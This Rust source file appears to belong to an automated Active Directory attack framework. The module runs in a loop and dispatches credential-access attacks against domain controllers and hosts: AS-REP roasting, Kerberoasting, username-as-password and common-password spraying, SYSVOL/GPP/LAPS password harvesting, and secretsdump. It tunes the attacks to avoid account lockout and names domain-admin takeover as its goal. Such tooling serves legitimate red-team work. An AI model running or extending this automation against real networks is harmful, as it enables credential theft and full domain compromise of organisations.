//! auto_credential_access -- kerberoast, AS-REP roast, password spray.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Complex credential access automation: kerberoast, AS-REP roast, password spray.
/// Interval: 15s + Notify wake. Matches Python `_auto_credential_access`.
pub async fn auto_credential_access(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // --- AS-REP Roast: one per domain (unauthenticated — no credentials required) ---
        let asrep_work: Vec<(String, String)> = {
            let state = dispatcher.state.read().await;
            state
                .domains
                .iter()
                .filter(|d| !state.is_processed(DEDUP_ASREP_DOMAINS, d))
                .filter_map(|domain| {
                    // Try DC map first, then fall back to target_ips[0]
                    let dc_ip = state
                        .domain_controllers
                        .get(domain)
                        .cloned()
                        .or_else(|| state.target_ips.first().cloned())?;
                    Some((domain.clone(), dc_ip))
                })
                .collect()
        };

        for (domain, dc_ip) in asrep_work {
            let payload = json!({
                "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
                "target_ip": dc_ip,
                "domain": domain,
            });

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 5)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, domain = %domain, "AS-REP roast dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_ASREP_DOMAINS, domain.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &domain)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch AS-REP roast"),
            }
        }

        // --- Kerberoast: one per domain + credential pair ---
        let kerberoast_work: Vec<(String, String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty())
                // Skip delegation accounts — Kerberoast is already done with
                // other creds, and burning auth on delegation accounts risks
                // lockout before S4U can use them.
                .filter(|c| !state.is_delegation_account(&c.username))
                // Skip quarantined credentials — locked out, retry after expiry.
                .filter(|c| !state.is_credential_quarantined(&c.username, &c.domain))
                .filter_map(|cred| {
                    let cred_domain = cred.domain.to_lowercase();
                    let dedup = format!("krb:{}:{}", cred_domain, cred.username.to_lowercase());
                    if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup) {
                        return None;
                    }
                    // Exact domain match first
                    if let Some(dc_ip) = state.domain_controllers.get(&cred_domain).cloned() {
                        return Some((dedup, dc_ip, cred_domain, cred.clone()));
                    }
                    // Fallback: check child domains (e.g. cred has "contoso.local"
                    // but user is actually in "child.contoso.local")
                    let suffix = format!(".{cred_domain}");
                    for (domain, dc_ip) in &state.domain_controllers {
                        if domain.ends_with(&suffix) {
                            debug!(
                                cred_domain = %cred_domain,
                                child_domain = %domain,
                                "Kerberoast: using child domain DC for parent-domain credential"
                            );
                            return Some((dedup, dc_ip.clone(), domain.clone(), cred.clone()));
                        }
                    }
                    // Last resort: use target_ips[0] if DC map has no entry for this domain
                    if let Some(fallback_ip) = state.target_ips.first().cloned() {
                        debug!(
                            cred_domain = %cred_domain,
                            fallback_ip = %fallback_ip,
                            "Kerberoast: using target IP fallback (no DC in map)"
                        );
                        return Some((dedup, fallback_ip, cred_domain, cred.clone()));
                    }
                    None
                })
                .take(2)
                .collect()
        };

        for (dedup_key, dc_ip, resolved_domain, cred) in kerberoast_work {
            match dispatcher
                .request_credential_access("kerberoast", &dc_ip, &resolved_domain, &cred, 5)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %resolved_domain, "Kerberoast dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CRACK_REQUESTS, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CRACK_REQUESTS, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch kerberoast"),
            }
        }

        // --- Password spray: username-as-password ---
        let spray_work: Vec<(String, String, String)> = {
            let state = dispatcher.state.read().await;
            state
                .users
                .iter()
                .filter(|u| !u.domain.is_empty())
                // Skip delegation accounts — their auth budget is reserved for
                // S4U exploitation. Spraying them causes lockout before S4U fires.
                .filter(|u| !state.is_delegation_account(&u.username))
                .filter(|u| !state.is_credential_quarantined(&u.username, &u.domain))
                .filter_map(|u| {
                    let user_domain = u.domain.to_lowercase();
                    let dedup = format!("{}:{}", user_domain, u.username.to_lowercase());
                    if state.is_processed(DEDUP_USERNAME_SPRAY, &dedup) {
                        return None;
                    }
                    // Exact match or child-domain fallback
                    let dc_ip = state
                        .domain_controllers
                        .get(&user_domain)
                        .cloned()
                        .or_else(|| {
                            let suffix = format!(".{user_domain}");
                            state
                                .domain_controllers
                                .iter()
                                .find(|(d, _)| d.ends_with(&suffix))
                                .map(|(_, ip)| ip.clone())
                        })?;
                    Some((dedup, dc_ip, u.domain.clone()))
                })
                .take(5)
                .collect()
        };

        // Submit one spray task per domain (batched)
        let mut sprayed_domains = std::collections::HashSet::new();
        for (_dedup_key, dc_ip, domain) in &spray_work {
            if sprayed_domains.contains(domain) {
                continue;
            }
            sprayed_domains.insert(domain.clone());

            let payload = json!({
                "technique": "username_as_password",
                "target_ip": dc_ip,
                "domain": domain,
            });

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 4)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %domain, "Password spray dispatched");
                    // Mark all users in this domain's batch as processed
                    for (dk, _, d) in &spray_work {
                        if d == domain {
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_USERNAME_SPRAY, dk.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_USERNAME_SPRAY, dk)
                                .await;
                        }
                    }
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch password spray"),
            }
        }

        // --- Low-hanging fruit: SYSVOL, GPP, LDAP descriptions, LAPS per new credential ---
        // Mirrors Python's fast credential discovery — dispatches high-success-rate
        // techniques that find hardcoded/stored passwords in Active Directory.
        let low_hanging_work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                // Skip delegation accounts — their auth is reserved for S4U.
                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                .filter(|c| !state.is_credential_quarantined(&c.username, &c.domain))
                .filter_map(|cred| {
                    let cred_domain = cred.domain.to_lowercase();
                    let dedup = format!("{}:{}", cred_domain, cred.username.to_lowercase());
                    if state.is_processed(DEDUP_LOW_HANGING, &dedup) {
                        return None;
                    }
                    // Find DC for this credential's domain
                    let dc_ip = state
                        .domain_controllers
                        .get(&cred_domain)
                        .cloned()
                        .or_else(|| {
                            let suffix = format!(".{cred_domain}");
                            state
                                .domain_controllers
                                .iter()
                                .find(|(d, _)| d.ends_with(&suffix))
                                .map(|(_, ip)| ip.clone())
                        })
                        .or_else(|| state.target_ips.first().cloned())?;
                    Some((dedup, dc_ip, cred.clone()))
                })
                .take(2) // Max 2 per cycle
                .collect()
        };

        for (dedup_key, dc_ip, cred) in low_hanging_work {
            match dispatcher
                .request_low_hanging_fruit(&dc_ip, &cred.domain, &cred, 4)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %cred.domain,
                        username = %cred.username,
                        "Low-hanging fruit credential discovery dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LOW_HANGING, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LOW_HANGING, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch low-hanging fruit"),
            }
        }

        // --- Secretsdump per new credential against same-domain hosts ---
        // Dispatches secretsdump for new credentials against hosts in the same
        // domain (or child/parent domains). Cross-domain attempts generate
        // failed auths that trigger AD account lockout.
        // Credentials may be local admin on member servers — secretsdump fails
        // fast if not, but when it succeeds it's the fastest path to DA.
        let sd_work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;

            // Skip if already DA
            if state.has_domain_admin {
                Vec::new()
            } else {
                let mut items = Vec::new();
                for cred in state
                    .credentials
                    .iter()
                    .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                    // Skip delegation accounts — secretsdump will always fail
                    // (they're not admin) and burns auth budget needed for S4U.
                    .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                    .filter(|c| !state.is_credential_quarantined(&c.username, &c.domain))
                {
                    let cred_domain = cred.domain.to_lowercase();
                    for host in &state.hosts {
                        // Resolve host domain: prefer hostname FQDN, fall back
                        // to domain_controllers map for bare-IP hosts.
                        let host_domain = {
                            let from_hostname = host
                                .hostname
                                .to_lowercase()
                                .split_once('.')
                                .map(|x| x.1)
                                .unwrap_or("")
                                .to_string();
                            if from_hostname.is_empty() {
                                // Check if this IP is a known DC
                                state
                                    .domain_controllers
                                    .iter()
                                    .find(|(_, ip)| ip.as_str() == host.ip)
                                    .map(|(d, _)| d.to_lowercase())
                                    .unwrap_or_default()
                            } else {
                                from_hostname
                            }
                        };
                        // Only target same-domain hosts. Skip unknown-domain
                        // hosts — they'll be retried next cycle after nmap
                        // populates hostnames.
                        if host_domain.is_empty()
                            || (host_domain != cred_domain
                                && !host_domain.ends_with(&format!(".{cred_domain}"))
                                && !cred_domain.ends_with(&format!(".{host_domain}")))
                        {
                            continue;
                        }

                        let dedup = format!(
                            "{}:{}:{}",
                            host.ip,
                            cred_domain,
                            cred.username.to_lowercase()
                        );
                        if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                            items.push((dedup, host.ip.clone(), cred.clone()));
                        }
                    }
                }
                items.into_iter().take(5).collect() // Max 5 per cycle
            }
        };

        for (dedup_key, target_ip, cred) in sd_work {
            let priority = if cred.is_admin { 2 } else { 7 };
            match dispatcher
                .request_secretsdump(&target_ip, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %target_ip,
                        username = %cred.username,
                        "Credential secretsdump dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch credential secretsdump"),
            }
        }

        // --- Common password spray: per domain when no admin creds found yet ---
        // Keep spraying common passwords until we find admin or achieve DA.
        let common_spray_work: Vec<(String, String)> = {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin || state.credentials.iter().any(|c| c.is_admin) {
                // Already have admin creds or DA — skip common spray
                Vec::new()
            } else {
                state
                    .domain_controllers
                    .iter()
                    .filter(|(domain, _)| {
                        let key = format!("common:{}", domain.to_lowercase());
                        !state.is_processed(DEDUP_PASSWORD_SPRAY, &key)
                    })
                    // Only spray after initial recon (AS-REP) has completed.
                    // This prevents spraying in the first cycle when Kerberoast
                    // hasn't had time to collect hashes yet.
                    .filter(|(domain, _)| {
                        state.is_processed(DEDUP_ASREP_DOMAINS, domain)
                            || state.is_processed(DEDUP_ASREP_DOMAINS, &domain.to_lowercase())
                    })
                    // Only spray after delegation enumeration has dispatched for
                    // at least one credential in this domain. Spraying before
                    // delegation can lock out accounts and prevent find_delegation
                    // from using valid credentials.
                    .filter(|(domain, _)| {
                        let prefix = format!("{}:", domain.to_lowercase());
                        state.has_processed_prefix(DEDUP_DELEGATION_CREDS, &prefix)
                    })
                    // Skip domains with UNCRACKED Kerberoast hashes —
                    // offline cracking is safer (no lockout risk) and handles
                    // complex passwords that spray would never find.
                    // Once all hashes are cracked (or none exist), spray proceeds
                    // as a fallback path for accounts without SPNs.
                    .filter(|(domain, _)| {
                        let d = domain.to_lowercase();
                        !state.hashes.iter().any(|h| {
                            h.hash_type.to_lowercase().contains("kerberoast")
                                && h.domain.to_lowercase() == d
                                && h.cracked_password.is_none()
                        })
                    })
                    .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
                    .collect()
            }
        };

        for (domain, dc_ip) in common_spray_work {
            let payload = json!({
                "techniques": ["password_spray", "username_as_password"],
                "reason": "low_hanging_fruit",
                "target_ip": dc_ip,
                "domain": domain,
                "use_common_passwords": true,
            });

            // Mark as processed BEFORE submitting to prevent duplicate deferred entries.
            // The task will be dispatched or deferred regardless.
            let key = format!("common:{}", domain.to_lowercase());
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_PASSWORD_SPRAY, key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_PASSWORD_SPRAY, &key)
                .await;

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 3)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, domain = %domain, "Common password spray dispatched");
                }
                Ok(None) => {
                    debug!(domain = %domain, "Common password spray deferred");
                }
                Err(e) => warn!(err = %e, "Failed to dispatch common password spray"),
            }
        }
    }
}
